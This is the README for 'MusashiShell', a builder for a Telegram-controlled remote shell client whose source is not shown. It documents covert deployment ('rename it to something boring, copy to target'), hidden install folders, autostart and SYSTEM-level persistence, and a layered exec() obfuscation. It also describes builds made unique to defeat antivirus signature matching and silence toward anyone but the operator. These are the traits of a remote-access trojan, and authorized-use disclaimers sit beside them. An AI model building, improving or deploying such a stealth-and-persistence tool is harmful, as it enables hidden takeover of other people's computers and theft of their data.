```markdown
# MusashiShell

Telegram-controlled remote administration client + binary builder. Configure once, get a self-installing `.exe` that reports back to your Telegram and accepts shell commands.

> ⚠️ **Authorized use only.** For systems you own or have written permission to administer. Unauthorized access is illegal.

---

## What it is

- **Builder** (`builder.py`) — interactive CLI. Takes a bot token, admin ID, client name and app name; generates and compiles a single-file binary.
- **Template** (`resources/template.py`) — the client itself. Self-installs into a hidden folder, registers in OS autostart (elevated if possible), connects to Telegram, runs shell commands from a single admin.

**Target OS support:** Windows, Linux, macOS.

---

## Requirements

**Build machine:**
```bash
pip install -r requirements.txt
```

**Target machine:** nothing. The binary is self-contained.

**Python:** 3.10+.

> PyInstaller cannot cross-compile. Build on Windows for a `.exe`, on Linux for ELF, on macOS for Mach-O.

---

## Quick start

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Run builder
python builder.py

# 3. Choose [1], enter:
#    - Bot token   (from @BotFather)
#    - Admin ID    (your numeric ID from @userinfobot)
#    - Client name (e.g. "BOT Charlie")
#    - App name    (exe / task / registry / unit, default: SystemEvents)

# 4. Wait ~2-3 min. Binary appears at:
#    build/<slug>/dist/<slug>_obf.exe

# 5. Rename it to something boring, copy to target, run.
#    Telegram will receive "🟢 [NAME] ONLINE!"

# NOTE!!! After creating the bot token, send the bot a `/start` message
#         to allow it to message you.
```

---

## Builder menu

| # | Action |
|---|---|
| 1 | Set config and build everything automatically |
| 2 | Rebuild `.exe` only (skips if nothing changed) |
| 3 | Regenerate `client.py` + `client_obf.py` |
| 4 | Show current settings |
| 5 | List built clients |
| 6 | Clean `build/` |
| 7 | Open log file |
| 0 | Exit |

Config is saved in `cfg/builder.conf`. Logs rotate in `logs/builder.log`.

---

## Bot commands

| Command | Action |
|---|---|
| `/start` | Host info + geolocation |
| `/help` | Command list |
| `/heartbeat` | Liveness: uptime, PID, offline flag |
| `/getfile <path>` | Download a file from target (≤ 50 MB) |
| `/putfile <dir>` | Upload a file from Telegram into `<dir>` |
| `/cmd <command>` | Run via `cmd.exe /c` (Win) or `sh` (Unix) |
| `/powershell <command>` | Run via PowerShell (Windows only) |
| `/uninstall` | Self-destruct with inline confirmation |
| *any text* | Shell command (no timeout, output chunked at 4000 chars) |

Examples:
```
dir
ps aux | head -20
netstat -an | findstr LISTEN
/cmd whoami /priv
/powershell Get-Process | Select -First 5
```

---

## Where the client installs itself

| OS | Elevated | Regular user |
|---|---|---|
| Windows | `C:\ProgramData\.<rand>\` + schtasks as SYSTEM | `%LOCALAPPDATA%\.<rand>\` + `HKCU\...\Run` |
| Linux | `/opt/.<rand>/` + systemd unit | `~/.local/share/.<rand>/` + XDG autostart |
| macOS | `/Library/Application Support/.<rand>/` + LaunchDaemon | `~/Library/Application Support/.<rand>/` + LaunchAgent |

On Windows, folder and file get `HIDDEN + SYSTEM` attributes.

**Install marker** (prevents duplicate copies; uses APP_NAME, default `SystemEvents`):
- Windows: `HKCU\Software\<APP_NAME>\LaunchPath`
- Unix: `~/.config/<APP_NAME>/install_path`

---

## Elevated install (Windows)

1. Right-click the renamed `.exe` → **Run as administrator**.
2. Accept the UAC prompt once.
3. Client re-installs to `ProgramData` and creates a `SYSTEM` scheduled task.
4. Every reboot from now on: silent start, highest privileges, no UAC.

---

## Uninstall

Two ways: manual (below) or via Telegram — send `/uninstall`, confirm with inline **Yes**, and the client removes itself and exits.

Manual removal, kill the process first:
```
taskkill /F /IM <APP_NAME>.exe /T
```

**Windows (elevated)** — replace `<APP_NAME>` with your app name (default `SystemEvents`):
```
schtasks /Delete /TN <APP_NAME> /F
reg delete "HKCU\Software\<APP_NAME>" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <APP_NAME> /f
```

**Linux (root):**
```bash
systemctl disable --now <APP_NAME>.service
rm -f /etc/systemd/system/<APP_NAME>.service
rm -rf /opt/.<rand>
rm -f ~/.config/<APP_NAME>/install_path
```

**macOS (root):**
```bash
launchctl unload -w /Library/LaunchDaemons/com.<APP_NAME>.plist
rm -f /Library/LaunchDaemons/com.<APP_NAME>.plist
rm -rf "/Library/Application Support/.<rand>"
```

---

## Directory layout

```
MusashiShell/
├── builder.py              # interactive builder
├── pyproject.toml
├── requirements.txt
├── README.md
├── LICENSE
├── resources/
│   ├── template.py         # client source with __PLACEHOLDERS__
│   └── app.ico             # optional Windows icon
├── cfg/
│   └── builder.conf        # auto-created; last used config
├── logs/
│   └── builder.log         # auto-created; rotating, 5×5 MB
└── build/
    └── <slug>/
        ├── client.py       # substituted source
        ├── client_obf.py   # obfuscated (single line)
        ├── dist/
        │   └── <slug>_obf.exe
        ├── work/
        └── .sig_obf.json   # cache signature
```

`<slug>` is derived from the client name: spaces → `_`, non-alphanumerics stripped. E.g. `BOT Charlie` → `BOT_Charlie`.

---

## Under the hood

- **Secrets (token, admin ID) are base64-encoded** inside the generated `client.py`. This is obfuscation, not encryption — it only defeats naive grep / regex scanners looking for the `\d+:...` bot-token pattern. Anyone with the binary can decode in one line.
- **Every build is byte-unique.** Three random letter/digit comments are injected at the top of `client.py` before obfuscation, so the payload and the final binary hash differ between builds. This defeats naive signature matching by hash.
- **Obfuscated payload is a single line.** `client_obf.py` contains only `_=lambda __:exec(__import__('gzip')...)` — no visible imports. All module inclusions are declared via PyInstaller's `--hidden-import` and `--collect-submodules` in `builder.py`.
- **Obfuscation layers.** gzip → lzma → zlib → base64 → reversed string. Unpacked at runtime by a lambda `exec()`.
- **Output encoding.** `cmd.exe` built-ins write in the OEM codepage (cp866 on Russian Windows, cp437 on US, cp932 on Japanese, ...) when stdout is a pipe. The client tries UTF-8 first, then falls back to the OEM codepage. This is why `dir` output is readable text, not `????`.
- **No console windows.** Every subprocess call on Windows uses `CREATE_NO_WINDOW`. The client is built with `--noconsole`. Nothing flashes when commands run.
- **Connection tracking.** The client notifies the admin once on first connection loss, stays silent for subsequent failures, and sends a "back online" message (with fresh device info) when the loop survives 3 s without raising.
- **Shutdown notifications.** `SIGINT` / `SIGTERM` / `SIGBREAK` handlers plus an `atexit` backstop send exactly one "shutting down" message per process.
- **Stealth for strangers.** Non-admin messages get no reply at all — no "access denied", nothing. The bot silently ignores anyone but the configured admin.
- **Geolocation cache.** Nine fallback geo-IP APIs are queried once per process; the result is cached in `_geo_cache` and reused for `/start` and every "back online" message.

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| No "ONLINE" in Telegram | Check token/admin ID; check internet; check AV quarantine |
| `Token already in use` | Another instance is running — kill it |
| Build fails on `*.pyd` `WinError 5` | Running client holds the DLL — `taskkill`, then rebuild |
| `dir` output is `????` | Old build — current one decodes OEM codepage correctly |
| Terminal broken after resize | Use Windows Terminal, not old cmd/conhost |
| Duplicate copies in new folders | Install marker broken — check registry / marker file |
| `ModuleNotFoundError: No module named 'X'` | Add `X` to the `HIDDEN` list in `builder.build_exe` and rebuild |
| PyInstaller says `pyinstaller not found` | `pip install pyinstaller`, or add Python's Scripts dir to `PATH` |

---

## Security notes

- **Bot token is a single point of failure.** Anyone with it controls every client. Rotate via @BotFather if leaked.
- **Token is recoverable** from the binary (obfuscated, not encrypted). Don't share binaries with untrusted parties.
- **AV may flag it** — self-copy + autostart + obfuscated payload = textbook malware signature. Add exclusions on your own machines.
- **Never install on machines you don't own.**

---

## License

GPL-3.0-or-later. See `LICENSE`.

---

## Legal

Provided for authorized security testing, red team engagements, and administration of systems you own. No liability for misuse. If you don't have **written permission**, don't install it.
```